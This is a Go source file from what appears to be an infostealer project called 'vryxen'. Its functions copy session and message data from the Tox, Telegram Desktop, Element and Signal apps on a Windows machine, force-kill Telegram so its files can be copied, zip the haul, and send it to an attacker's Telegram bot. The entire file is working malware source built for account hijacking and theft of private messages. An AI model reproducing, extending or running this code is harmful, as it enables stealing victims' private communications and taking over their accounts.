package Socials

import (
	"os"
	"os/exec"
	"path/filepath"

	"github.com/unf6/vryxen/pkg/utils/fileutil"
	"github.com/unf6/vryxen/pkg/utils/requests"
)

func Run(botToken, chatId string) {
	folderMessaging := filepath.Join(os.Getenv("TEMP"), "Vryxen", "SocialMedias")
	toxStealer(folderMessaging)
	telegramStealer(folderMessaging)
	elementStealer(folderMessaging)
	signalStealer(folderMessaging)

	tempZip := filepath.Join(folderMessaging, "Socials.zip")
	if err := fileutil.Zip(folderMessaging, tempZip); err != nil {
		return
	}

	message := fmt.Sprintf("Socials: %s", fileutil.Tree(folderMessaging, ""))

	requests.Send2TelegramMessage(botToken, chatId, message)
	requests.Send2TelegramDocument(botToken, chatId, tempZip)
	
}

func toxStealer(folderMessaging string) {
	toxFolder := filepath.Join(os.Getenv("APPDATA"), "Tox")
	if _, err := os.Stat(toxFolder); os.IsNotExist(err) {
		return
	}
	toxSession := filepath.Join(folderMessaging, "Tox")
	os.MkdirAll(toxSession, os.ModePerm)
	fileutil.CopyDir(toxFolder, toxSession)
}

func telegramStealer(folderMessaging string) {
	processName := "telegram"
	pathtele := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "Telegram Desktop", "tdata")
	if _, err := os.Stat(pathtele); os.IsNotExist(err) {
		return
	}
	cmd := exec.Command("taskkill", "/F", "/IM", processName+".exe")
	cmd.Run()

	telegramSession := filepath.Join(folderMessaging, "Telegram")
	os.MkdirAll(telegramSession, os.ModePerm)
	fileutil.CopyDir(pathtele, telegramSession)

	cmd = exec.Command("start", pathtele)
	cmd.Run()
}

func elementStealer(folderMessaging string) {
	elementFolder := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "Element")
	if _, err := os.Stat(elementFolder); os.IsNotExist(err) {
		return
	}
	elementSession := filepath.Join(folderMessaging, "Element")
	os.MkdirAll(elementSession, os.ModePerm)
	indexedDB := filepath.Join(elementFolder, "IndexedDB")
	fileutil.CopyDir(indexedDB, elementSession)
	localStorage := filepath.Join(elementFolder, "Local Storage")
	fileutil.CopyDir(localStorage, elementSession)
}

func signalStealer(folderMessaging string) {
	signalFolder := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "Signal")
	if _, err := os.Stat(signalFolder); os.IsNotExist(err) {
		return
	}
	signalSession := filepath.Join(folderMessaging, "Signal")
	os.MkdirAll(signalSession, os.ModePerm)
	sqlFolder := filepath.Join(signalFolder, "sql")
	fileutil.CopyDir(sqlFolder, signalSession)
	attachmentsFolder := filepath.Join(signalFolder, "attachments.noindex")
	fileutil.CopyDir(attachmentsFolder, signalSession)
	configJson := filepath.Join(signalFolder, "config.json")
	fileutil.CopyFile(configJson, signalSession)
}